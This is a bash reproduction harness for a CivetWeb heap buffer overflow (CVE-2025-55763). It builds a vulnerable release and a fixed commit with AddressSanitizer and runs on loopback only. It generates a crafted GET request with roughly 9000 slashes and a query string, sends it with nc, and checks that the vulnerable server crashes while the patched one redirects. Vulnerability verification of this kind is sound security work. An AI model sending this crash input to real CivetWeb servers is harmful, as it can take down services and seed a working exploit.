#!/bin/bash
# CivetWeb CVE-2025-55763 — offline, loopback-only replay.
# Usage: bash run.sh [OUTDIR]
# Builds pinned v1.16 and the exact merged-fix commit c584455 from the
# committed tarballs, sends one crafted directory-redirect HTTP request to
# each listener on 127.0.0.1, and emits a normalized trace plus sha256.
set -u

BASE="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$BASE/out-run}"
rm -rf "$OUT"
mkdir -p "$OUT/docroot/d" "$OUT/vuln" "$OUT/fix"
printf 'hello\n' > "$OUT/docroot/d/index.html"
printf 'root\n' > "$OUT/docroot/index.html"

trace="$OUT/trace.txt"
: > "$trace"
pass=0; fail=0
ck() { # name expected actual
  if [ "$2" = "$3" ]; then
    printf 'PASS %s = %s\n' "$1" "$2" >> "$trace"; pass=$((pass+1))
  else
    printf 'FAIL %s: expected [%s] got [%s]\n' "$1" "$2" "$3" >> "$trace"; fail=$((fail+1))
  fi
}

# ---- pins (committed, no network) ----
ck pin_v1_16 f0e471c1bf4e7804a6cfb41ea9d13e7d623b2bcc7bc1e2a4dd54951a24d60285 \
   "$(sha256sum "$BASE/pins/civetweb-1.16.tar.gz" | cut -d' ' -f1)"
ck pin_fixed 7e3ba593fe46de4ebfcdea92977860cd530481d9650722681812a8afdfd78864 \
   "$(sha256sum "$BASE/pins/civetweb-fixed-c584455.tar.gz" | cut -d' ' -f1)"
ck pin_fixpatch 16902ca3d94a2be78c20e982278f9773fe6cc88993e1933afb15e06667998e60 \
   "$(sha256sum "$BASE/pins/civetweb-fixed-c584455.patch" | cut -d' ' -f1)"
ck pin_poc e8b30b946e41e1ed5b764a10b9ca9c0a9bccc0b0ae8fde2cf02197a0390d91c1 \
   "$(sha256sum "$BASE/pins/http_request_crash_input.txt" | cut -d' ' -f1)"

tar xzf "$BASE/pins/civetweb-1.16.tar.gz" -C "$OUT/vuln"
tar xzf "$BASE/pins/civetweb-fixed-c584455.tar.gz" -C "$OUT/fix"
V="$OUT/vuln/civetweb-1.16"
F="$OUT/fix/civetweb-c584455624d9a9f6ec72839f61dd3cdb9d8435ba"

# ---- raw pinned source facts ----
ck vuln_sink 1 "$(grep -c 'strcat(new_path, ri->query_string);' "$V/src/civetweb.c")"
ck fixed_strncat 1 "$(grep -c 'strncat(new_path, ri->query_string, max_append);' "$F/src/civetweb.c")"
ck vuln_sink_line 15261 "$(grep -n 'strcat(new_path, "?");' "$V/src/civetweb.c" | cut -d: -f1)"
ck vuln_query_line 15262 "$(grep -n 'strcat(new_path, ri->query_string);' "$V/src/civetweb.c" | cut -d: -f1)"
ck vuln_alloc_line 15253 "$(grep -n 'new_path = (char \*)mg_malloc_ctx(buflen, conn->phys_ctx);' "$V/src/civetweb.c" | cut -d: -f1)"
ck vuln_buflen_line 15251 "$(grep -n 'buflen += strlen(ri->query_string);' "$V/src/civetweb.c" | head -1 | cut -d: -f1)"

# ---- builds ----
(cd "$V" && make TEST_ASAN=1 NO_SSL=1 -j4 civetweb > "$OUT/vuln-build.log" 2>&1)
ck vuln_build 0 "$?"
(cd "$F" && make TEST_ASAN=1 NO_SSL=1 -j4 civetweb > "$OUT/fix-build.log" 2>&1)
ck fix_build 0 "$?"

# ---- crafted request: long raw path collapses to directory /d ----
python3 - "$OUT" <<'PY'
import sys
out = sys.argv[1]
p = '/' + '/' * 9000 + 'd'
req = 'GET ' + p + '?q=1 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n'
with open(out + '/crafted.req', 'wb') as f:
    f.write(req.encode())
PY
ck crafted_req_bytes 9059 "$(wc -c < "$OUT/crafted.req")"

run_one() { # binary port logprefix
  local bin="$1" port="$2" pre="$3"
  ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
    "$bin" -listening_ports "127.0.0.1:$port" -document_root "$OUT/docroot" \
    -access_log_file "$OUT/$pre-access.log" -error_log_file "$OUT/$pre-error.log" \
    > "$OUT/$pre-server.out" 2>&1 &
  local pid=$!
  for i in $(seq 1 40); do
    if curl -sS -o /dev/null "http://127.0.0.1:$port/index.html" 2>/dev/null; then break; fi
    sleep 0.1
  done
  timeout 8 nc 127.0.0.1 "$port" < "$OUT/crafted.req" > "$OUT/$pre-client.out" 2>&1
  echo $? > "$OUT/$pre-nc.rc"
  sleep 1
  kill "$pid" 2>/dev/null
  wait "$pid" 2>/dev/null
}

run_one "$V/civetweb" 18090 vuln
run_one "$F/civetweb" 18091 fix

python3 - "$OUT" <<'PY'
import sys
out = sys.argv[1]
p = '/' + '/' * 10 + 'd'
with open(out + '/short.req', 'wb') as f:
    f.write(('GET ' + p + '?q=1 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n').encode())
PY
ASAN_OPTIONS=abort_on_error=0:detect_leaks=0 \
  "$V/civetweb" -listening_ports 127.0.0.1:18092 -document_root "$OUT/docroot" \
  -access_log_file "$OUT/neg-access.log" -error_log_file "$OUT/neg-error.log" \
  > "$OUT/neg-server.out" 2>&1 &
NPID=$!
for i in $(seq 1 40); do
  if curl -sS -o /dev/null http://127.0.0.1:18092/index.html 2>/dev/null; then break; fi
  sleep 0.1
done
timeout 8 nc 127.0.0.1 18092 < "$OUT/short.req" > "$OUT/neg-client.out" 2>&1
sleep 1
kill "$NPID" 2>/dev/null
wait "$NPID" 2>/dev/null
ck neg_asan 0 "$(grep -ci 'ERROR: AddressSanitizer' "$OUT/neg-server.out" || true)"
ck neg_redirect 1 "$(grep -c '^HTTP/1.1 301' "$OUT/neg-client.out")"

# ---- observed outcomes, normalized (no PIDs, addresses, host paths) ----
ck vuln_asan 1 "$(grep -c 'ERROR: AddressSanitizer: heap-buffer-overflow' "$OUT/vuln-server.out")"
ck vuln_write2 1 "$(grep -c 'WRITE of size 2' "$OUT/vuln-server.out")"
ck vuln_sink_frame 1 "$(grep -c 'civetweb.c:15261' "$OUT/vuln-server.out")"
ck vuln_alloc_frame 1 "$(grep -c 'civetweb.c:15253' "$OUT/vuln-server.out")"
ck vuln_region 1 "$(grep -c '8197-byte region' "$OUT/vuln-server.out")"
ck vuln_no_response 0 "$(wc -c < "$OUT/vuln-client.out")"
ck fix_asan 0 "$(grep -ci 'ERROR: AddressSanitizer' "$OUT/fix-server.out" || true)"
ck fix_redirect 1 "$(grep -c '^HTTP/1.1 301' "$OUT/fix-client.out")"

printf 'PASS_COUNT=%d\n' "$pass" >> "$trace"
printf 'FAIL_COUNT=%d\n' "$fail" >> "$trace"
printf 'TRACE_SHA256=%s\n' "$(sha256sum "$trace" | cut -d' ' -f1)" >> "$trace"
cat "$trace"
exit 0
